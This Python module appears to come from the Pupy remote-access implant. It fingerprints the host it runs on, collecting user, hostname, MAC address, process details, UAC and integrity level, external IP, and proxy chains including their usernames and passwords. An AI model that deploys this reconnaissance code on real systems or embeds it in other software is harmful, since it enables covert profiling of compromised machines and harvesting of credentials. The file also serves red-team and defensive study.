# -*- coding: utf-8 -*-

from __future__ import absolute_import
from __future__ import division
from __future__ import print_function
from __future__ import unicode_literals

import platform
import getpass
import uuid
import sys
import os
import logging
import socket
import pupy.agent as pupy



def _as_unicode(x):
    if isinstance(x, bytes):
        try:
            return x.decode(sys.getfilesystemencoding())
        except UnicodeError:
            try:
                return x.decode('UTF-8')
            except UnicodeError:
                return x.decode('latin1')

    return x


# Restore write/stdout/stderr


if not hasattr(os, 'real_write'):
    if type(os.write).__name__ == 'builtin_function_or_method':
        setattr(os, 'real_write', os.write)


allowed_std = ('file', 'Blackhole', 'NoneType')


if not hasattr(sys, 'real_stdout') and type(
        sys.stdout).__name__ in allowed_std:
    setattr(sys, 'real_stdout', sys.stdout)


if not hasattr(sys, 'real_stderr') and type(
        sys.stderr).__name__ in allowed_std:
    setattr(sys, 'real_stderr', sys.stderr)


if not hasattr(sys, 'real_stdin') and type(
        sys.stdin).__name__ in allowed_std:
    setattr(sys, 'real_stdin', sys.stdin)


if not hasattr(os, 'stdout_write'):
    def stdout_write(fd, s):
        if fd == 1:
            return sys.stdout.write(s)
        elif fd == 2:
            return sys.stderr.write(s)
        else:
            return os.real_write(fd, s)

    setattr(os, 'stdout_write', stdout_write)


def redirect_stdo(stdout, stderr):
    if not hasattr(sys, 'real_stdout'):
        setattr(sys, 'real_stdout', sys.stdout)

    if not hasattr(sys, 'real_stderr'):
        setattr(sys, 'real_stderr', sys.stdout)

    sys.stdout = stdout
    sys.stderr = stderr
    os.write = os.stdout_write


def redirect_stdio(stdin, stdout, stderr):
    if not hasattr(sys, 'real_stdin'):
        setattr(sys, 'real_stdin', sys.stdin)

    sys.stdin = stdin
    redirect_stdo(stdout, stderr)


def reset_stdo():
    if hasattr(sys, 'real_stdout'):
        sys.stdout = sys.real_stdout

    if hasattr(sys, 'real_stderr'):
        sys.stderr = sys.real_stderr

    os.write = os.real_write


def reset_stdio():
    if hasattr(sys, 'real_stdin'):
        sys.stdout = sys.real_stdin

    reset_stdo()


def get_integrity_level():
    '''from http://www.programcreek.com/python/example/3211/ctypes.c_long'''

    if sys.platform != 'win32':
        if os.geteuid() != 0:
            return "Medium"
        else:
            return "High"

    import ctypes

    mapping = {
        0x0000: u'Untrusted',
        0x1000: u'Low',
        0x2000: u'Medium',
        0x2100: u'Medium high',
        0x3000: u'High',
        0x4000: u'System',
        0x5000: u'Protected process',
    }

    BOOL = ctypes.c_long
    DWORD = ctypes.c_ulong
    HANDLE = ctypes.c_void_p

    class SID_AND_ATTRIBUTES(ctypes.Structure):
        _fields_ = [
            ('Sid', ctypes.c_void_p),
            ('Attributes', DWORD),
        ]

    class TOKEN_MANDATORY_LABEL(ctypes.Structure):
        _fields_ = [
            ('Label', SID_AND_ATTRIBUTES),
        ]

    TOKEN_READ = DWORD(0x20008)
    TokenIntegrityLevel = ctypes.c_int(25)
    ERROR_INSUFFICIENT_BUFFER = 122

    kernel32 = ctypes.windll.WinDLL('kernel32')
    advapi32 = ctypes.windll.WinDLL('advapi32')

    GetLastError = kernel32.GetLastError
    GetLastError.argtypes = ()
    GetLastError.restype = DWORD

    CloseHandle = kernel32.CloseHandle
    CloseHandle.argtypes = (HANDLE,)

    GetCurrentProcess = kernel32.GetCurrentProcess
    GetCurrentProcess.argtypes = ()
    GetCurrentProcess.restype = ctypes.c_void_p

    OpenProcessToken = advapi32.OpenProcessToken
    OpenProcessToken.argtypes = (
            HANDLE, DWORD, ctypes.POINTER(HANDLE))
    OpenProcessToken.restype = BOOL

    GetTokenInformation = advapi32.GetTokenInformation
    GetTokenInformation.argtypes = (
            HANDLE, ctypes.c_long, ctypes.c_void_p,
            DWORD, ctypes.POINTER(DWORD)
    )
    GetTokenInformation.restype = BOOL

    GetSidSubAuthorityCount = advapi32.GetSidSubAuthorityCount
    GetSidSubAuthorityCount.argtypes = (
        ctypes.c_void_p,
    )
    GetSidSubAuthorityCount.restype = ctypes.POINTER(ctypes.c_ubyte)

    GetSidSubAuthority = advapi32.GetSidSubAuthority
    GetSidSubAuthority.argtypes = (
        ctypes.c_void_p, DWORD
    )
    GetSidSubAuthority.restype = ctypes.POINTER(DWORD)

    token = ctypes.c_void_p()
    proc_handle = GetCurrentProcess()

    if not OpenProcessToken(
            proc_handle, TOKEN_READ, ctypes.byref(token)):
        logging.error('Failed to get process token')
        return None

    if token.value == 0:
        logging.error('Got a NULL token')
        return None

    try:
        info_size = DWORD()
        if GetTokenInformation(
            token, TokenIntegrityLevel, ctypes.c_void_p(),
                info_size, ctypes.byref(info_size)):
            logging.error('GetTokenInformation() failed expectation')
            return None

        if info_size.value == 0:
            logging.error('GetTokenInformation() returned size 0')
            return None

        dwLastError = GetLastError()

        if dwLastError != ERROR_INSUFFICIENT_BUFFER:

            logging.error(
                'GetTokenInformation(): Unknown error: %d',
                dwLastError
            )
            return None

        token_info = TOKEN_MANDATORY_LABEL()
        ctypes.resize(token_info, info_size.value)

        if not GetTokenInformation(
            token, TokenIntegrityLevel, ctypes.byref(token_info),
                info_size, ctypes.byref(info_size)):

            logging.error(
                'GetTokenInformation(): Unknown error with buffer size %d: %d',
                info_size.value, GetLastError()
            )
            return None

        p_sid_size = GetSidSubAuthorityCount(token_info.Label.Sid)
        res = GetSidSubAuthority(
            token_info.Label.Sid, p_sid_size.contents.value - 1
        )
        value = res.contents.value

        return mapping.get(value) or u'0x%04x' % value

    finally:
        CloseHandle(token)


def getUACLevel():
    if sys.platform != 'win32':
        return 'N/A'

    from _winreg import (
        ConnectRegistry, HKEY_LOCAL_MACHINE, OpenKey,
        EnumValue, CloseKey
    )

    consentPromptBehaviorAdmin = None
    enableLUA = None
    promptOnSecureDesktop = None

    try:
        Registry = ConnectRegistry(None, HKEY_LOCAL_MACHINE)
        RawKey = OpenKey(
            Registry,
            'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System'
        )

        i = 0

        while True:
            try:
                name, value, type = EnumValue(RawKey, i)
                if name == "ConsentPromptBehaviorAdmin":
                    consentPromptBehaviorAdmin = value
                elif name == "EnableLUA":
                    enableLUA = value
                elif name == "PromptOnSecureDesktop":
                    promptOnSecureDesktop = value

                i += 1

            except WindowsError:
                break

    except Exception:
        return "?"

    finally:
        CloseKey(RawKey)

    if consentPromptBehaviorAdmin == 2 and enableLUA == 1 and \
            promptOnSecureDesktop == 1:
        return "3/3"
    elif consentPromptBehaviorAdmin == 5 and enableLUA == 1 and \
            promptOnSecureDesktop == 1:
        return "2/3"
    elif consentPromptBehaviorAdmin == 5 and enableLUA == 1 and \
            promptOnSecureDesktop == 0:
        return "1/3"
    elif enableLUA == 0:
        return "0/3"
    else:
        return "?"


def GetUserName():
    from ctypes import (
        windll, WinError, create_unicode_buffer,
        byref, c_uint32, GetLastError
    )

    DWORD = c_uint32
    nSize = DWORD(0)
    windll.secur32.GetUserNameExW(2, None, byref(nSize))
    error = GetLastError()
    ERROR_INSUFFICIENT_BUFFER = 122
    ERROR_MORE_DATA_AVAILABLE = 234

    if error not in (ERROR_INSUFFICIENT_BUFFER, ERROR_MORE_DATA_AVAILABLE):
        raise WinError(error)

    lpBuffer = create_unicode_buffer('', nSize.value + 1)
    nSize = DWORD(nSize.value + 1)
    success = windll.secur32.GetUserNameExW(2, lpBuffer, byref(nSize))

    if not success:
        raise WinError(GetLastError())

    return lpBuffer.value


def get_uuid():
    user = None
    hostname = None
    node = None
    plat = None
    release = None
    version = None
    machine = None
    macaddr = None
    pid = None
    proc_arch = None
    proc_path = sys.executable
    cmdline = None

    if hasattr(sys, 'real_argv'):
        cmdline = ' '.join(sys.real_argv)
    elif sys.argv:
        cmdline = ' '.join(sys.argv)
    else:
        cmdline = proc_path

    uacLevel = None
    integrity_level = None

    try:
        if sys.platform == 'win32':
            user = _as_unicode(GetUserName())
        else:
            user = _as_unicode(getpass.getuser())
    except Exception as e:
        logging.exception(e)
        user = '?'

    try:
        hostname = _as_unicode(platform.node())
        if sys.platform == 'win32' and user.startswith(hostname + '\\'):
            user = user.split('\\', 1)[1]
    except Exception:
        pass

    try:
        hostname = socket.getfqdn().lower()
        if hostname.endswith(('.localdomain', '.localhost')):
            hostname, _ = hostname.rsplit('.', 1)
    except Exception:
        pass

    try:
        version = platform.platform()
    except Exception:
        pass

    try:
        plat = platform.system()
        if plat == 'Java':
            # Jython!
            if hasattr(sys, 'system_java'):
                plat = sys.system_java
            else:
                jsystem = sys.platform.getshadow()

                # Fix this crap
                setattr(sys, 'platform', jsystem)

                if jsystem == 'linux2':
                    plat = 'Linux+Java'
                elif jsystem == 'win32':
                    plat = 'Windows+Java'
                else:
                    plat = jsystem + '+Java'

                setattr(sys, 'system_java', plat)

                import ctypes.util
                plat += '+JyNI'

                setattr(sys, 'system_java', plat)

                del ctypes.util

    except Exception:
        pass

    try:
        release = platform.release()
    except Exception:
        pass

    try:
        version = platform.version()
    except Exception:
        pass

    try:
        machine = platform.machine()
    except Exception:
        pass

    try:
        pid = os.getpid()
    except Exception:
        pass

    try:
        osname = os.name
    except Exception:
        pass

    try:
        proc_arch = platform.architecture()[0]
    except Exception:
        pass

    try:
        node = '{:012x}'.format(uuid.getnode())
        macaddr = ':'.join(node[i:i+2] for i in range(0, 12, 2))
    except Exception:
        pass

    try:
        uacLevel = getUACLevel()
    except Exception:
        uacLevel = "?"

    try:
        integrity_level = get_integrity_level()
    except Exception:
        integrity_level = "?"

    try:
        if hasattr(pupy, 'cid'):
            cid = pupy.cid
        elif hasattr(pupy, 'client'):
            cid = pupy.client.cid
    except:
        cid = None

    proxy = None
    try:
        from pupy.network.lib.proxies import LAST_PROXY, has_wpad
        if hasattr(pupy, 'client') and pupy.client.connection_info.get(
                'proxies', []):
            try:
                proxy = ' -> '.join(
                    '{}://{}{}'.format(
                        proxy.type,
                        '{}:{}@'.format(
                            proxy.username, proxy.password
                        ) if proxy.username or proxy.password else '',
                        proxy.addr
                    ) for proxy in pupy.client.connection_info['proxies']
                )
            except Exception as e:
                proxy = str(e)

        elif LAST_PROXY:
            proxy = tuple([
                x for x in LAST_PROXY if x
            ])
        elif has_wpad:
            proxy = 'wpad'

    except ImportError:
        proxy = None

    try:
        external_ip = None

        from pupy.network.lib.online import LAST_EXTERNAL_IP
        if LAST_EXTERNAL_IP:
            external_ip = str(LAST_EXTERNAL_IP)
    except ImportError:
        external_ip = None

    return {
        'user': user,
        'hostname': hostname,
        'node': node,
        'platform': plat,
        'release': release,
        'version': version,
        'os_arch': machine,
        'os_name': osname,
        'node': node,
        'macaddr': macaddr,
        'pid': pid,
        'proc_arch': proc_arch,
        'exec_path': proc_path,
        'cmdline': cmdline,
        'uac_lvl': uacLevel,
        'intgty_lvl': integrity_level,
        'cid': cid,
        'proxy': proxy,
        'external_ip': external_ip
    }
